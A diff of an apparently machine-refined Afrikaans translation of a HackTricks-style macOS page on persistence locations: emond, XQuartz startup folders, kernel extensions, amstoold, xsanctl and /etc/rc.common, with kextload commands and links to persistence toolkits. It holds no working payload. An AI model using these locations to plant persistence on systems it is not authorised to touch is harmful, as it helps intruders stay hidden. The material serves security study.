-Ingevoerd deur Apple, **emond** is 'n loggingsmeganisme wat blykbaar onderontwikkeld of moontlik verlate is, maar dit bly toeganklik. Alhoewel dit nie veral voordelig is vir 'n Mac-administrateur nie, kan hierdie obscuure diens dien as 'n subtiele volhardingsmetode vir bedreigingsakteurs, waarskynlik onopgemerk deur die meeste macOS-administrateurs.
+Ingevoer deur Apple, **emond** is 'n logmeganisme wat na alle waarskynlikheid onderontwikkel of moontlik opgegee is, maar tog steeds toeganklik bly. Alhoewel dit nie besonder nuttig vir 'n Mac-administrateur is nie, kan hierdie onduidelike diens as 'n subtiele persistensmetode vir bedreigingsakteurs dien, waarskynlik onopgemerk deur die meeste macOS-administrateurs.
 
-Vir diegene wat bewus is van sy bestaan, is dit eenvoudig om enige kwaadwillige gebruik van **emond** te identifiseer. Die stelsels se LaunchDaemon vir hierdie diens soek na skripte om in 'n enkele gids uit te voer. Om dit te ondersoek, kan die volgende opdrag gebruik word:
+Vir dié wat van die bestaan daarvan bewus is, is dit eenvoudig om enige kwaadwillige gebruik van **emond** te identifiseer. Die stelsel se LaunchDaemon vir hierdie diens soek skripte om in 'n enkele gids uit te voer. Om dit na te gaan, kan die volgende opdrag gebruik word:
 ```bash
 ls -l /private/var/db/emondClients
 ```
@@ -1504,29 +1518,29 @@ ls -l /private/var/db/emondClients
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)
 
-#### Location
+#### Ligging
 
 - **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
-- Wortel benodig
+- **Vereis root**
 - **Trigger**: Met XQuartz
 
-#### Description & Exploit
+#### Beskrywing & Exploit
 
-XQuartz is **nie meer geïnstalleer in macOS** nie, so as jy meer inligting wil hê, kyk na die skrywe.
+XQuartz is **nie meer in macOS geïnstalleer nie**, dus as jy meer inligting wil hê, sien die writeup.
 
 ### ~~kext~~
 
 > [!CAUTION]
-> Dit is so ingewikkeld om kext te installeer selfs as wortel dat ek dit nie sal oorweeg om van sandboxes te ontsnap of selfs vir volharding nie (tenzij jy 'n exploit het)
+> Dit is so ingewikkeld om kext te installeer, selfs as root, dat ek dit nie sal oorweeg as 'n manier om uit sandboxes te ontsnap of selfs vir persistence te gebruik nie (tensy jy 'n exploit het)
 
-#### Location
+#### Ligging
 
-Om 'n KEXT as 'n opstartitem te installeer, moet dit **in een van die volgende plekke geïnstalleer word**:
+Om 'n KEXT as 'n startup item te installeer, moet dit **in een van die volgende liggings geïnstalleer wees**:
 
 - `/System/Library/Extensions`
-- KEXT-lêers ingebou in die OS X-bedryfstelsel.
+- KEXT files built into the OS X operating system.
 - `/Library/Extensions`
-- KEXT-lêers geïnstalleer deur 3de party sagteware
+- KEXT files installed by 3rd party software
 
 Jy kan tans gelaaide kext-lêers lys met:
 ```bash
@@ -1536,42 +1550,42 @@ kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
 kextunload /path/to/kext.kext
 kextunload -b com.apple.driver.ExampleBundle
 ```
-Vir meer inligting oor [**kernel uitbreidings kyk hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).
+Vir meer inligting oor [**kernuitbreidings, kyk hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).
 
 ### ~~amstoold~~
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)
 
-#### Ligging
+#### Location
 
 - **`/usr/local/bin/amstoold`**
 - Root benodig
 
-#### Beskrywing & Exploit
+#### Description & Exploitation
 
-Blijkbaar het die `plist` van `/System/Library/LaunchAgents/com.apple.amstoold.plist` hierdie binêre gebruik terwyl dit 'n XPC-diens blootgestel het... die ding is dat die binêre nie bestaan het nie, so jy kon iets daar plaas en wanneer die XPC-diens geroep word, sal jou binêre geroep word.
+Skynbaar het die `plist` van `/System/Library/LaunchAgents/com.apple.amstoold.plist` hierdie binary gebruik terwyl dit 'n XPC service blootgestel het... die ding is dat die binary nie bestaan het nie, so jy kon iets daar plaas en wanneer die XPC service aangeroep word sal jou binary aangeroep word.
 
-Ek kan dit nie meer in my macOS vind nie.
+Ek kan dit nie meer op my macOS vind nie.
 
 ### ~~xsanctl~~
 
-Skrywe: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)
+Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)
 
-#### Ligging
+#### Location
 
 - **`/Library/Preferences/Xsan/.xsanrc`**
 - Root benodig
 - **Trigger**: Wanneer die diens uitgevoer word (selde)
 
-#### Beskrywing & exploit
+#### Description & exploit
 
-Blijkbaar is dit nie baie algemeen om hierdie skrif uit te voer nie en ek kon dit selfs nie in my macOS vind nie, so as jy meer inligting wil hê, kyk na die skrywe.
+Skynbaar is dit nie baie algemeen dat hierdie script uitgevoer word nie en ek kon dit nie eers op my macOS vind nie, so as jy meer inligting wil hê, kyk na die writeup.
 
 ### ~~/etc/rc.common~~
 
 > [!CAUTION] > **Dit werk nie in moderne MacOS weergawes nie**
 
-Dit is ook moontlik om hier **opdragte te plaas wat by opstart uitgevoer sal word.** Voorbeeld van 'n gewone rc.common skrif:
+Dit is ook moontlik om hier **opdragte te plaas wat by opstart uitgevoer sal word.** Voorbeeld van 'n gewone rc.common script:
 ```bash
 #
 # Common setup for startup scripts.
@@ -1664,9 +1678,13 @@ restart) RestartService ;;
 esac
 }
 ```
-## Volhardingstegnieke en -hulpmiddels
+## Persistensie tegnieke en gereedskap
 
 - [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
 - [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)
+
+## Verwysings
+
+- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
 
 {{#include ../banners/hacktricks-training.md}}
